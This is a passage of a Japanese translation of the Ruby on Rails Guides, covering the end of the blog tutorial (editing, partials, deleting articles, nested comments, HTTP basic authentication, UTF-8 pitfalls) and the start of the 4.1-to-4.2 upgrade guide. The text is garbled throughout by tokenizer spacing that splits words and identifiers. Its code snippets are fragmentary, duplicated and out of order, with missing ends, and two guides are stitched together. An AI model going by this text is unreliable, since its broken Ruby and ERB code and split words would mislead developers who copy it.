▁create の ときに 既に 行った ように 、 記事 の 更新 に 失敗 して エラーが発生し た場合 、 その ことを ユーザーに 伝 え るように しましょう 。
▁create アクション で 使用 した ` article _ params ` メソッドを ここで も 使う ことにします 。
▁ TIP : ▁` update ` に 属性 をすべて 渡す 必要はありません 。
▁たとえば 、 `@ article . update ( title : ▁' A ▁ new ▁ title ') ` を実行し た場合 、 Rails は ` title ` 属性 のみ を更新し 、 それ以外の 属性 は 変更 しません 。
▁最後に 、` edit ` アクション へのリンク を 全 記事 の 一覧 に追加 しましょう 。 ` app / views / articles / index . html . erb ` に 以下のように 手 を加え て " S h o w " リンク の 隣 に Edit リンク を追加します 。
▁< th ▁c ol span =" 2 " ></ th >
▁< td > <%= ▁ link _ to ▁' S h o w ', ▁ article _ path ( article ) ▁%></ td >
▁< td > <%= ▁ link _ to ▁' Edit ', ▁ edit _ article _ path ( article ) ▁%></ td >
▁</ tr >
▁ 同様に 、` app / views / articles / show . html . erb ` テンプレート にも Edit リンク を追加しましょう 。 こう しておけば 各 記事 の ページ から 編集 を 行える ようになります 。
▁ テンプレート の 最 下 部 に 以下 を追加します 。
▁ ここ まで の 変更 で 、 アプリケーションの 外 観 は 以下のような感じ になっている はずです 。
▁ Edit リンク が追加され た index アクション ]( images / getting _ started / index _ action _ with _ edit _ link . png )
▁### ▁ 部分 テンプレート ( パーシャル ) を使用して ビュー の 重複 コードを き れ い にする
▁ TIP : ▁ パーシャル について の詳細 は 本 ガイド の [ レイアウト と レンダリング ]( layouts _ and _ render ing . html ) を参照してください 。
▁` app / views / articles / _ form . html . erb ` という名前の パーシャル ファイル を作成し 、 以下の 内容 を 入力 してください 。
▁<%= ▁ form _ for ▁@ article ▁do ▁| f | ▁%>
▁この コードを よく 観 察 してみる と 、` form _ for ` の 宣言 部分 以外に は 元の コード と の違い がない ことがわかります 。
▁ 他の フォーム 内の コードを 置き換え る パーシャル 内で の ` form _ for ` 宣言 が この ように 短 く て 簡潔 で 済 む のは 、 `@ article ` が RESTful ルーティング の 完全な セット に対応する ▁** リソース ** ▁ であり 、 必要な U R I と メソッドを Rails が それ に基いて 推測 できる からです 。
▁今度は ` app / views / articles / new . html . erb ` ビュー を 完全に 書き 直 して 、 今 作成した パーシャル を ここで 使って みましょう 。
▁< h 1> New ▁ article </ h 1>
▁<%= ▁render ▁' form ' ▁%>
▁続いて 、` app / views / articles / edit . html . erb ` ビュー でも 同じ 作業 を行います 。
▁< h 1> Edit ▁ article </ h 1>
▁### ▁ 記事 を削除する
▁ いよいよ C R U D の D まで 到 達 しました 。 ここでは 記事 を データベースから 削除 します 。
▁ DELETE ▁ / articles / : id ( . : format ) ▁ articles # destroy
▁ ルーティング メソッド である ` delete ` は 、 リソース を削除する ときに 使用 する必要があります 。
▁なお 、 この 削除 用 ルーティング に 通常の ` get ` ルーティング が 使用されている と 、 以下のような 危 険 な URL を 送信 できてしまいます 。
▁< a ▁ href =' http :// example . com / articles /1/ destroy ' > lo o k ▁ at ▁this ▁ cat !
▁def ▁ destroy
▁@ article . destroy
▁@ article ▁= ▁Article . new
▁@ article ▁= ▁Article . new ( article _ params )
▁if ▁@ article . save
▁ redirect _ to ▁@ article
▁ else
▁render ▁' new '
▁if ▁@ article . update ( article _ params )
▁render ▁' edit '
▁def ▁ destroy
▁@ article . destroy
▁ redirect _ to ▁ articles _ path
▁def ▁ article _ params
▁ params . require (: article ). per m it (: title , ▁: text )
▁ データベースの レコード を削除し たい 場合には 、 Active ▁Record の ` destroy ` メソッドを 呼 び ます 。
▁なお 、 レコード の 削除 の場合 、 それ 専 用の ビュー テンプレート は 不要です 。 その 代わりに 削除 後に ` index ` アクションに リダイレクト します 。
▁最後に 、 ▁` index ` アクション の テンプレート ( ` app / views / articles / index . html . erb ` ) に ' D es tr o y ' リンク を追加し 、 機能を 完成 させ ましょう 。
▁< h 1> L ist ing ▁Article s </ h 1>
▁< th ▁c ol span =" 3 " ></ th >
▁< td > <%= ▁ link _ to ▁' D es tr o y ', ▁ article _ path ( article ) ,
▁ method
▁ } ▁%></ td >
▁ 上で 追加 した コード では 、` link _ to ` メソッドの 使い 方が これまで と 違 っている ことにご注目ください 。
▁2 番目の 引数 で 名前付きルート を渡して いる 点 は これまで と同じ ですが 、 その後 に 別の 引数 があります 。
▁この `: method ` オプション と `: ' data - confirm ' ` オプションは HTML 5 の 属性 です 。 この リンクをクリックすると 、 本当に 削除 して よい かどうかを確認 する メッセージ を表示し 、 その後 ` delete ` メソッドと リンクを 送信 します 。
▁この ダ イ ア ログ ボックス の 表示 は ` jquery _ u js ` という JavaScript ファイル によって自動的に 行われます 。 この ファイルは アプリケーションの 生成 時に 自動的に アプリケーション レイアウト ▁( ` app / views / layouts / application . html . erb ` ) ▁ に 含 まれ ます 。
▁この JavaScript ファイル がない と 、 ダ イ ア ログ ボックス は 表示 され なくなります 。
▁C on fi rm ▁D i a log ]( images / getting _ started / confirm _ d i a log . png )
▁以上で 記事 の作成 、 表示 、 一覧 表示 、 更新 、 削除 を ひ と とおり 実装 できました 。 お 疲 れ さ まで した !
▁ ルーティング の詳細については 、 本 ガイド の [ Rails の ルーティング ]( routing . html ) を参照してください 。
▁2 番目の モデル を追加する
▁今度は アプリケーションに 第 2 の モデル を追加しましょう 。
▁この 第 2 の モデル では 、 記事 への コメント を 扱 います 。
▁### ▁ モデル を生成する
▁ 今回の モデルの 生成 には 、` Article ` モデル を生成し たとき と同じ ジェネレータ を使用します 。
▁ 作成する ` Comment ` モデル は 、 記事 への 参 照 を保持し ます 。
▁以下の コマンド を ターミナル で 実行 してください 。
▁この コマンド を実行すると 、 4 つの ファイルが 生成されます 。
▁| ▁ ファイル ▁| ▁ 目的 ▁|
▁| ▁ db / migrate / 20 14 0 1 20 20 10 10 _ create _ comments . rb ▁| ▁ データベースに コメント 用の テーブル を作成する ための マイグレーション ファイル ▁( ファイル名 の タイムスタンプ は これ とは 異なります ) ▁|
▁| ▁app / models / comment . rb ▁| ▁ Comment モデル ▁|
▁| ▁test / models / comment _ test . rb ▁| ▁ Comment モデル をテストする ための ハ ー ネ ス ▁|
▁| ▁test / fixtures / comments . yml ▁| ▁ テスト で使用する サンプル コメント ▁|
▁最初に ` app / models / comment . rb ` を見てみましょう 。
▁ Comment モデル の内容 は 、 これまで に 見 た ` Article ` モデルと 非常に よく 似 ています 。
▁ 違 い と い えば 、 Active ▁Record の ▁ _ 関連付け ▁( ア ソ シ エ ー ション ) _ ▁ を設定する ための ` belongs _ to ▁: article ` という 行 がある 点 です 。
▁ 関連付け の詳細については 、 本 ガイド の 次の 節 で説明します 。
▁ モデルの ファイルの 他 に マイグレーション ファイル も 生成 されています 。 マイグレーション ファイルは 、 モデル に対応する データベース テーブル を生成する ために 使用されます 。
▁class ▁ Create Comment s ▁< ▁ActiveRecord :: Migration
▁create _ table ▁: comments ▁do ▁| t |
▁t . string ▁: comment er
▁t . text ▁: body
▁# ▁ 以下の行 によって ` article _ id ` という 整 数 カラム が追加され る
▁t . ref er en ce s ▁: article , ▁ index : ▁true
▁` t . ref er en ce s ` という 行 は 、 2 つの モデルの 関連付け を指定する ための 外部キー を設定します 。
▁このとき 、 関連付け 用の インデックス も カラム 上 に 作成されます 。
▁それでは マイグレーション を実行し ましょう 。
▁Rails は 、 これまで 実行 されていない マイグレーション だけ を 適切に 見 分 け て 実行 します ので 、 以下のような メッセージ だけ が表示される はずです 。
▁= = ▁ Create Comment s : ▁ m i gra t ing ▁= ================ ================ ================
▁-- ▁create _ table (: comments )
▁-> ▁ 0.0 1 15 s
▁= = ▁ Create Comment s : ▁ migrate d ▁( 0.0 1 19 s ) ▁= = = = ========= ========= ========= =========
▁### ▁ モデル 同士 を 関連付け る
▁Active ▁Record の 関連付け 機能 により 、 2 つの モデル の間に リレーションシップ を簡単に 宣言 することができます 。
▁ 今回の 記事 と コメント という モデル の場合 、 以下 のいずれか の 方法で 関連付けを 設定 できます 。
▁* ▁1 つの コメント は 1 つの 記事 に 属 する ▁( E a ch ▁ comment ▁ belongs ▁to ▁on e ▁ article )。
▁* ▁1 つの 記事 は 複数の コメント を 持 て る ▁( O n e ▁ article ▁c an ▁ ha ve ▁ many ▁ comments )。
▁ そして 上の 方法 ( における 英語 の 記述 ) は 、 Rails で 関連付けを 宣言 するために 使用される 文法 と 非常に 似 ています 。
▁` Comment ` ▁ モデル ▁( app / models / comment . rb ) ▁ 内の コード に 既に 書かれてい た ように 、 1 つの 記事 には 1 つの コメント が 属 しています 。
▁ そして 、 Article モデル ` app / models / article . rb ` を 編集 して 、 他 方 の モデル を 追加する必要があります 。
▁2 つの モデル で 行われている これらの 宣言 によって 、 さまざまな 動作 が 自動 化 されています 。
▁たとえば 、 `@ article ` という インスタンス変数 に 記事 が 1 つ 含 まれ ている のであれば 、 `@ article . comments ` と 書く だけで その 記事 に 関連付けられている コメント をすべて 取得 する ことができる のです 。
▁ TIP : ▁Active ▁Record の 関連付け の詳細については 、[ Active ▁Record の 関連付け ( ア ソ シ エ ー ション ) ]( association _ basic s . html ) ガイド を参照してください 。
▁### ▁ コメント への ルーティング を追加する
▁` welcome ` コントローラ で 行った とき と同様 、` comments ` を参照 するために Rails が 知 っ ておく べ き ルーティング を 追加する必要があります 。
▁ 再 び ` config / routes . rb ` ファイルを 開 き 、 以下のように 変更 してください 。
▁この 設定 により 、` article ` の 内 側 に ▁ _ ネスト された リソース _ ▁ として ` comments ` が 作成されます 。
▁これは 、 モデルの 記述 とは 別の 視 点 から 、 記事 と コメント の 間 の リレーションシップ を 階層 的に 捉 え た もの である と 言 え ます 。
▁ TIP : ▁ ルーティング の詳細については [ Rails の ルーティング ]( routing . html ) を参照してください 。
▁### ▁ コントローラ を生成する
▁ モデル を 手 作り した のです から 、 それ に 合 った コントローラ も 作 って み た く なります 。
▁という ことで 再 び これまで と同じ ジェネレータ を使用して みましょう 。
▁| ▁ ファイル / ディレクトリ ▁| ▁ 目的 ▁|
▁--------- --------------- ----------------
▁| ▁app / controllers / comments _ controller . rb ▁| ▁ コメント 用 コントローラ ▁|
▁| ▁app / views / comments / ▁| ▁ コントローラの ビュー は ここに お か れる ▁|
▁| ▁test / controllers / comments _ controller _ test . rb ▁| ▁ コントローラの テスト 用 ファイル ▁|
▁| ▁app / helpers / comments _ helper . rb ▁| ▁ ビュー ヘルパー ▁|
▁| ▁app / assets / javascripts / comment . js . coffee ▁| ▁ コントローラ 用の CoffeeScript ▁|
▁| ▁app / assets / stylesheets / comment . css . s css ▁| ▁ コントローラ 用の CSS ▁( カ ス ケ ー デ ィ ング スタイルシート ) ▁ ファイル ▁|
▁ 一般的な ブログ と同様 、 この ブログ の 記事 を 読 んだ 人 は そこ に 直接 コメント を追加した くなる でしょう 。 そして コメント を 追加 後に 元の 記事 表示 ページに 戻 り 、 コメント が そこ に 反 映 されている ことを確認 したい はずです 。
▁ そこで 、` Comment sController ` を使用して コメント を作成 したり 、 ス パ ム コメント が 書き 込 まれ たら 削除 できるように したい と思います 。
▁ そこで 最初に 、 Article の show テンプレート ▁( ` app / views / articles / show . html . erb ` ) ▁ を 改 造 して 新 規 コメント を作成 できるように しましょう 。
▁< h 2 > A d d ▁a ▁ comment : </ h 2 >
▁<%= ▁ form _ for ( [ @ article , ▁@ article . comments . build ] ) ▁do ▁| f | ▁%>
▁<%= ▁f . label ▁: comment er ▁% >< br >
▁<%= ▁f . text _ field ▁: comment er ▁%>
▁<%= ▁f . label ▁: body ▁% >< br >
▁<%= ▁f . text _ ar e a ▁: body ▁%>
▁上のコードでは 、` Article ` の show ページに フォーム が 1 つ 追加 されています 。 この フォーム は ` Comment sController ` の ` create ` アクション を呼び出す ことで コメント を 新規作成 します 。
▁` form _ for ` 呼び出し では 配列 を 1 つ 渡 しています 。 これは ` / articles /1/ comments ` のような 「 ネスト した ルーティング ▁( n e st ed ▁ route )」 を生成します 。
▁今度は ` app / controllers / comments _ controller . rb ` の ` create ` アクション を 改 造 しましょう 。
▁class ▁ Comment sController ▁< ▁ Application Controller
▁@ article ▁= ▁Article . find ( params [: article _ id ] )
▁@ comment ▁= ▁@ article . comments . create ( comment _ params )
▁ redirect _ to ▁ article _ path (@ article )
▁def ▁ comment _ params
▁ params . require (: comment ). per m it (: comment er , ▁: body )
▁上のコードは 、 Article コントローラの コードを 書い ていた とき よりも 何 だ か 複 雑 に 見え ます 。
▁これは ネ ス テ ィ ング を使用した こと によって 複 雑 さ が 増 した のです 。
▁ コメント 関連 の リクエスト では 、 コメント が追加され る 先 の 記事 が ど れ で あった か を 忘れ ないように しておく必要があります 。 そこで 、` Article ` モデルの ` find ` メソッドを 最初に 呼び出し 、 リクエスト で 言 及 されている 記事 ( の オブジェクト ) を取得し て @ article に保存 しています 。
▁さらに このコード では 、 関連付け によって 使用できる ようになった メソッドを い く つ も 利用 しています 。
▁ `@ article . comments ` に対して ` create ` メソッド を実行する ことで 、 コメント の作成 と 保存 を 同時に 行 っています ( 訳 注 : ▁` build ` メソッド に すれば 作成 のみ で 保存 は 行 いません )。
▁この 方法で コメント を作成する と 、 コメント と 記事 が自動的に リンク され 、 指定された 記事 に対して コメント が 従 属 する ようになります 。
▁ 新しい コメント の作成 が完了し たら 、` article _ path (@ article ) ` ヘルパー を使用して 元の 記事 の 画面 に 戻 ります 。
▁ 既に 説明したように 、 この ヘルパー を呼び出す と ` Article sController ` の ` show ` アクション が 呼び出され 、` show . html . erb ` テンプレート が 描画 されます 。
▁この 画面 に コメント を 表示 できるように したい ので 、` app / views / articles / show . html . erb ` に 以下のコード を追加しましょう 。
▁< h 2 > Comment s </ h 2 >
▁<% ▁@ article . comments . each ▁do ▁| comment | ▁%>
▁< strong > Comment er : </ strong >
▁<%= ▁ comment . comment er ▁%>
▁< strong > Comment : </ strong >
▁<%= ▁ comment . body ▁%>
▁以上で 、 ブログ に 記事 や コメント を 自由に 追加 して 、 それら を 正しい 場所 に 表示 できるようになりました 。
▁ 記事 に コメント が追加され た ところ ]( images / getting _ started / article _ with _ comments . png )
▁ リファクタリング
▁ さ て 、 ブログ の 記事 と コメント が 動作する ようになった ので 、 ここで ` app / views / articles / show . html . erb ` テンプレート を見てみましょう 。
▁ 何 や ら コードが たくさん 書かれてい て 読み にくい ように 思 え ます 。
▁ここで も パーシャル を使用して コードを き れ い に しましょう 。
▁### ▁ パーシャル コレクション を 描画 する
▁最初に 、 特 定 記事 の コメント をすべて 表示する 部分を 切り 出 して コメント パーシャル を作成し ましょう 。
▁< strong > Comment er : </ strong >
▁<%= ▁ comment . comment er ▁%>
▁< strong > Comment : </ strong >
▁<%= ▁ comment . body ▁%>
▁続いて 、` app / views / articles / show . html . erb ` の内容 を 以下のように 変更 しましょう 。
▁これにより 、` app / views / comments / _ comment . html . erb ` パーシャル が 、 `@ article . comments ` コレクション に 含 まれ ている コメント をすべて 出力 する ようになりました 。
▁` render ` メソッドが `@ article . comments ` コレクション に含まれる 要素 を 1 つ 1 つ 列 挙 するときに 、 各 コメント を パーシャル と同じ 名前 の ローカル変数 に 自動的に 割り当て ます 。 この場合は ` comment ` という ローカル変数 が 使用 され 、 これは パーシャル で の 表示 に 使用されます 。
▁### ▁ パーシャル の フォーム を 描画 する
▁今度は コメント 作成 部分 も パーシャル に 追 い 出 してみましょう 。
▁` app / views / comments / _ form . html . erb ` ファイル を作成し 、 以下のように 入力 します 。
▁続いて ` app / views / articles / show . html . erb ` の内容 を 以下のように 変更 しましょう 。
▁2 番目の render は 、 描画 したい パーシャル テンプレート である ` comments / form ` を 単 純 に 定義 している だけです 。
▁` comments / form ` と 書く だけで 、 Rails は 区切 り の ス ラ ッ シ ュ 文字 に 気 付き 、` app / views / comments ` ディレクトリ の ` _ form . html . erb ` パーシャル を 描画 すれば よい ということ を 理解 し 、 実行 してくれます 。 ` app / views / comments / _ form . html . erb ` など と 書く 必要はありません 。
▁ `@ article ` オブジェクトは インスタンス変数 なので 、 ビューで 出力 される どの パーシャル から も アクセス できます 。
▁ コメント を削除する
▁ ス パ ム コメント を 削除 できるように する の も 、 この ブログ では 重要な 機能 です 。
▁ そのため の ビュー を作成し 、` Comment sController ` に ` destroy ` アクション を 作成する必要があります 。
▁最初に ` app / views / comments / _ comment . html . erb ` パーシャル に 削除 用の リンク を追加しましょう 。
▁<%= ▁ link _ to ▁' D es tr o y ▁ Comment ', ▁[ comment . article , ▁ comment ] ,
▁ method : ▁: delete ,
▁ data : ▁ { ▁ confirm : ▁' A re ▁you ▁ s ur e ? '
▁この 新しい " D es tr o y ▁ Comment " リンクをクリックすると 、` DELETE ▁ / articles / : article _ id / comments / : id ` という リクエスト が ` Comment sController ` に 送信 されます 。 コントローラ は それ を 受け 取 って 、 どの コメント を 削除 すべき か を検索する ことになります 。 それ では コントローラ ▁( ` app / controllers / comments _ controller . rb ` ) ▁ に ` destroy ` アクション を追加しましょう 。
▁@ comment ▁= ▁@ article . comments . find ( params [: id ] )
▁@ comment . destroy
▁` destroy ` アクション では 、 まず どの 記事 が 対象 である か を 検索 して @ article に保存 し 、 続いて `@ article . comments ` コレクション の 中 の どの コメント が 対象 である か を 特 定 して @ comment に保存 します 。 そして その コメント を データベースから 削除 し 、 終わっ たら 記事 の ` show ` アクションに 戻 ります 。
▁### ▁ 関連付けられたオブジェクト も 削除 する
▁Rails では 関連付け に ` dependent ` オプション を指定する ことで これを 実現 しています 。
▁Article モデル ` app / models / article . rb ` を 以下のように 変更 しましょう 。
▁has _ many ▁: comments , ▁ dependent : ▁: destroy
▁### ▁B A S I C 認 証
▁Rails では このような 場合に 便利な 、 非常に シンプルな HTTP 認証システム が 用意されてい ます 。
▁ http _ basic _ authenticate _ with ▁name : ▁" d h h ", ▁ password : ▁" secret ", ▁ except : ▁ [: index , ▁: show ]
▁ コメント の 削除 も 認 証 済み ユーザーに だけ 許可 したい ので 、` Comment sController ` ▁( ` app / controllers / comments _ controller . rb ` ) ▁ に 以下のように 追 記 しましょう 。
▁ http _ basic _ authenticate _ with ▁name : ▁" d h h ", ▁ password : ▁" secret ", ▁ only : ▁: destroy
▁# ▁ ...
▁ここで 記事 を 新規作成 し よう と すると 、 以下のような B A S I C ▁ http 認 証 ダ イ ア ログ が表示されます 。
▁B as i c ▁ HTTP ▁A u the n tic ation ▁C h all en g e ]( images / getting _ started / ch all en g e . png )
▁もちろん 、 Rails では 他の 認 証 方法 を使用する こともできます 。
▁Rails には さまざまな 認証システム があります が 、 そ の中で 人 気 が 高 い 認証システム は [ D e v is e ]( https :// github . com / p l at a format ec / de v is e ) と [ A u th log i c ]( https :// github . com / bin ary log i c / a u th log i c ) ▁gem の 2 つ です 。
▁### ▁その 他の セキュリティ 対策
▁ セキュリティ 、 それ も Web アプリケーションの セキュリティ は 非常に 幅 広 く 、 かつ 詳 細 に 渡 っています 。
▁Rails アプリケーションの セキュリティ の詳細については 、 本 ガイド の [ Rails セキュリティ ガイド ]( security . html ) を参照してください 。
▁次に 学ぶ べ き こと
▁以上で 、 Rails アプリケーションを 初めて 作る という 試 み は 終わり です 。 この後 は 自由に 更新 したり 実 験 を 重 ね たり できます 。
▁もちろん 、 何 の 助 け も な し に Web アプリケーションを 作 ら なければならない など という ことはありません 。
▁Rails を使用して Web アプリケーションを 立 ち 上 げ たり 実行 したり する う え で 助 け が 必要 になった ら 、 以下の サポート 用 リソース を 自由に 参 照 できます 。
▁* ▁[ Ruby ▁on ▁Rails チュートリアル ]( http :// railstutorial . j p )
▁* ▁[ Ruby ▁on ▁Rails メ ー リ ング リスト ]( http :// www . ruby . or . j p / j a / te ch / development / web _ application / 100 _ com m un ity . html )
▁* ▁ ir c . free no de . net 上の [ # rubyonrails ]( ir c :// ir c . free no de . net / # rubyonrails ) チ ャ ン ネ ル
▁Rails には 、 rake コマンドライン ユ ー テ ィ リ テ ィ を使用して 生成 できる ビルトイン ヘ ル プ もあります 。
▁* ▁` rake ▁ doc : guides ` を実行すると 、 本 Rails ガイド の 完全な コピー が アプリケーションの ` doc / guides ` フォルダ に 生成されます 。
▁ ブラウザで ` doc / guides / index . html ` を開く ことで ガイド を参照 できます 。
▁* ▁` rake ▁ doc : rails ` を実行すると 、 Rails ▁API ドキュメント の 完全な コピー が アプリケーションの ` doc / api ` フォルダ に 生成されます 。
▁ ブラウザで ` doc / api / index . html ` を開いて API ドキュメント を参照 できます 。
▁ Re d C lo th ▁gem を ` Gemfile ` に 追 記 して ` bundle ▁install ` を実行する ことで 利用 できるようになります 。
▁ 設定 の 落 と し 穴
▁Rails で の 無 用 な ト ラ ブ ル を避ける ための 最も 初 歩 的な 方法は 、 外部 データを 常に UT F - 8 で 保存 することです 。
▁この とおり に しない と 、 Ruby ライブラリ や Rails は ネ イ テ ィ ブ データを た び た び UT F - 8 に変換 し なければ な らず 、 しか も ときに 失敗する ことがあります 。 外部 データを 常に UT F - 8 に しておくこと を ぜ ひ お勧め します 。
▁ 外部 データ の エンコード が 不 統 一 な 場合に よく 起 き る 症 状 として は 、 たとえば 画面 に 黒 い 菱 型 ◆ と 疑問符 が表示される という もの があります 。
▁ 他にも 、 " ü " という 文字 のは ず が " Ã 1 ⁄ 4 " という 文字 に 変 わ っている 、 などの 症 状 もあります 。
▁Rails では こう した 問題 を 緩 和 する ため 、 問題 の 原 因 を 自動的に 検出 して 修正 するために 内部で 多くの 手順 を行って います 。
▁しかし 、 UT F - 8 で 保存 されていない 外部 データ がある と 、 Rails による 自動 検出 / 修正 が 効 か ずに 文字 化 け が発生する ことがあります 。
▁ UT F - 8 でない データ の 主 な 原 因 は 以下の 2 つ です 。
▁* ▁ テキストエディタ : ▁Text M at e を含む 多くの テキストエディタ は 、 デフォルトで UT F - 8 エンコード で テキスト を 保存 してくれます 。
▁ 使用している テキストエディタ が この よう になって い ない場合 、 テンプレート を表示する 時に é などの 特 殊 文字 が ◆ ? のような 感 じ で ブラウザで 表示される ことがあります 。
▁これは i 18 n ( 国 際 化 ) 用の 翻 訳 ファイル で 発生 する こともあります 。
▁ 一部の D re am w e a ver のように UT F - 8 保存 が デフォルトで ない エディタ であっても 、 デフォルト を UT F - 8 に変更 する方法 は 用意されてい る はずです 。
▁ エンコード は UT F - 8 に 変え てください 。
▁* ▁ データベース : ▁Rails は データベースから 読み だ した データを 境 界 上で UT F - 8 に変換 します 。
▁しかし 、 使用している データベースの 内部 エンコード 設定 が UT F - 8 になって い ない場合 、 UT F - 8 の 文字 の一部 を データベースに そのまま 保存 できない ことがあります 。
▁たとえば データベースの 内部 エンコード が L at in - 1 になっている と 、 ロ シ ア 語 ・ ヘ ブ ラ イ 語 ・ 日 本 語 などの 文字 を データベースに保存 したときに これらの 情報 は 永 久 に 失 わ れ てしまいます 。
▁ できる か ぎ り 、 データベースの 内部 エンコード は UT F - 8 に して おいてください 。
▁Rails ▁ アップグレード ガイド
▁= ========= ========= ================
▁ 本 章では 、 アプリケーションで 使用されている Ruby ▁on ▁Rails のバージョン を 、 新しい バージョン に アップグレード する 際 の 手順 について 示 します 。
▁ アップグレード の 手順 は 、 Rails のバージョン ごとに 個 別 に 記 載 されています 。
▁ 一般的な ア ド バ イ ス
▁ 言 う まで も ないこと ですが 、 既存の アプリケーションを アップグレード する 際に は 、 何 のために アップグレード する のか を は っ き り させ ておく 必要があります 。
▁ 新しい バージョン のうち どの 機能 が 必要 になる のか 、 既存の コードの サポート が どの ぐらい 困 難 になる のか 、 アップグレード に 必要な 時間 と ス キ ル は ど れ ほど 必要 か など 、 い く つ もの 要素 を 調 整 し なければなりません 。
▁### ▁ テスティング の カ バ レ ッ ジ
▁ アップグレード 後に アプリケーション が 正常に動作し ている ことを確認する 方法 として は 、 良い テスト カ バ レ ッ ジ を アップグレード 前に 準備 しておく の が 最 善 です 。
▁ アプリケーションを 一 気 に 検 査 する 自動 テスト がない と 、 変更 点 をすべて 手動で 確認 し なければ な らず 膨 大 な 時間 が か か ってしまいます 。
▁Rails のような アプリケーション の場合 、 これは アプリケーションの あらゆる 機能を 一 つ 残 らず 確認 し なければならない ということです 。
▁ アップグレード の 実 施 は 、 テスト カ バ レ ッ ジ を き ち ん と 準備 して から 行なう よう 、 お 願 い いた します 。
▁### ▁Ruby のバージョン
▁Rails は 、 その バージョン が リリース された 時点 で 最新の バージョンの Ruby に 依 存 しています 。
▁* ▁Rails ▁3 以上 では 、 Ruby ▁1. 8 . 7 以降 が 必 須 です 。
▁これ より 古 い Ruby の サポート は 公式 に 停 止 しています 。
▁ できる だけ 早 く アップグレード を お 願 い します 。
▁* ▁Rails ▁3.2 . x は Ruby ▁1. 8 . 7 の 最 終 ブランチ です 。
▁* ▁Rails ▁4 では Ruby ▁2 . 0 が 推 奨 されます 。 Ruby ▁1. 9 . 3 以上 が 必 須 です 。
▁ TIP : ▁Ruby ▁1. 8 . 7 ▁ p 2 4 8 および p 2 4 9 には Rails を ク ラ ッ シ ュ させる マ ー シ ャ リ ング バグ があります 。
▁Ruby ▁ E n ter p ri s e ▁ Edit ion では 1 . 8 . 7 - 20 1 0.0 2 以降 この バグ は 修正 されています 。
▁Ruby ▁1. 9 系 を使用する場合 、 Ruby ▁1. 9 . 1 は あ から さ ま な セ グ メ ン テ ー ション 違 反 が発生する ため 使用 できません 。 1 . 9 . 3 を ご 使用 ください 。
▁### ▁ Rake タスク
▁Rails には ` rails : update ` という rake タスク があります 。
▁ Gemfile に記載されている Rails のバージョン を 更新 後 、 この rake タスク を実行して ください 。
▁これにより 、 新しい バージョン で の ファイル 作成 や 既 存 ファイルの 変更を 対 話 形式 で 行なう ことができます 。
▁$ ▁rake ▁ rails : update
▁id ent ical ▁config / b oo t . rb
▁ ex ist ▁config
▁ con f li ct ▁config / routes . rb
▁ O ver write ▁ / my app / config / routes . rb ?
▁( ent er ▁" h " ▁for ▁ help ) ▁[ Y n a q d h ]
▁ force ▁config / routes . rb
▁ con f li ct ▁config / application . rb
▁ O ver write ▁ / my app / config / application . rb ?
▁ force ▁config / application . rb
▁ con f li ct ▁config / environment . rb
▁ 予 期 し なかった 変更 が発生し た場合 は 、 必ず 差 分 を 十分 に チェック してください 。
▁Rails ▁ 4.1 から Rails ▁4 . 2 への アップグレード
▁### ▁Web ▁C on s ol e ▁gem
▁最初に 、 Gemfile の ` development ` グループ に ` gem ▁' web - console ', ▁' ~ > ▁2 . 0 ' ` を追加し 、` bundle ▁install ` を実行して ください ▁( この gem は Rails を 過 去 のバージョン から アップグレード した 場合には 含 まれ ないので 、 手動で 追加する必要があります )。
▁gem の インストール 完了 後 、` <%= ▁console ▁%> ` などの コンソール ヘルパー への 参 照 を ビュー に追加する だけで 、 どの ビュー でも コンソール を 利用 できるようになります 。
▁この コンソール は 、 development 環境 の ビューで 表示される すべての エラー ページに も 表示 されます 。
▁### ▁ Re s p o nder s ▁gem
▁` respond _ with ` および クラス レベル の ` respond _ to ` メソッドは 、` respond er s ` ▁gem に 移 転 しました 。
▁これらの メソッド を使用したい場合 は 、 Gemfile に ` gem ▁' respond er s ', ▁' ~ > ▁2 . 0 ' ` と 記述 する だけで 利用 できます 。
▁ 今後 、` respond _ with ` 呼び出し 、 および クラス レベル の ` respond _ to ` 呼び出し は 、` respond er s ` ▁gem な し では 動作 しません 。
▁# ▁app / controllers / users _ controller . rb
▁ respond _ to ▁: html , ▁: json
▁def ▁ show
▁@ user ▁= ▁User . find ( params [: id ] )
▁ respond _ with ▁@ user
▁ インスタンス レベル の ` respond _ to ` は 今回の アップグレード の 影 響 を 受け ません ので 、 gem を追加する 必要はありません 。
▁ format . html
▁ format . json ▁ { ▁render ▁ json : ▁@ user ▁ }
▁詳細については [ # 16 5 2 6 ]( https :// github . com / rails / rails / pull / 16 5 2 6 ) を参照してください 。
▁### ▁ ト ラ ン ザ ク ション コールバック の エラー 処理
▁ 現在の Active ▁Record では 、` after _ r o ll b ack ` や ` after _ commit ` コールバック で の 例外 を 抑 制 し ており 、 例外 時に は ログ 出力 のみ が 行われます 。
▁ 次の バージョン から は 、 これらの エラー は 抑 制 され なくなります ので ご注意ください 。
▁ 今後 は 他の Active ▁Record コールバック と同様 の エラー 処理 を行います 。
▁` after _ r o ll b ack ` コールバック や ` after _ commit ` コールバック を定義する と 、 この 変更 に とも な う 非推奨 警 告 が表示される ようになりました 。
▁この 変更 内容 を 十分 理解 し 、 受け 入 れる 準備 が でき ている のであれば 、` config / application . rb ` に 以下の 記述 を行なう ことで 非推奨 警 告 が表示され ないように することができます 。
▁config . active _ record . raise _ in _ tr an s action al _ c all b ack s ▁= ▁true
▁詳細については 、[ # 14 4 88 ]( https :// github . com / rails / rails / pull / 14 4 88 ) および [ # 16 5 3 7 ]( https :// github . com / rails / rails / pull / 16 5 3 7 ) を参照してください 。
▁### ▁ テスト ケース の 実行 順序
▁Rails ▁5 . 0 のテスト ケース は 、 デフォルトで ランダム に 実行される よう になる 予定です 。
▁この 変更 に 備 え て 、 テスト 実行 順 を明示的に指定 する ` active _ support . test _ order ` という 新しい 設定 オプション が Rails ▁4 . 2 に 導入 されました 。
▁この オプション を使用すると 、 たとえば テスト 実行 順 を 現 行 の 仕 様 の ま ま に しておき たい場合は `: s or t ed ` を 指定 したり 、 ランダム 実行 を 今 のうち に 導入 したい場合は `: r and o m ` を 指定 したり することができます 。
▁この オプション に 値が 指定 されていない と 、 非推奨 警 告 が表示されます 。
▁ 非推奨 警 告 が表示され ないように するには 、 test 環境 に 以下の 記述 を追加します 。
▁# ▁config / environments / test . rb
▁Rails . application . con figure ▁do
▁config . active _ support . test _ order ▁= ▁: s or t ed ▁# ▁`: r and o m ` に しても よい
▁### ▁ シ リ ア ル 化 属性
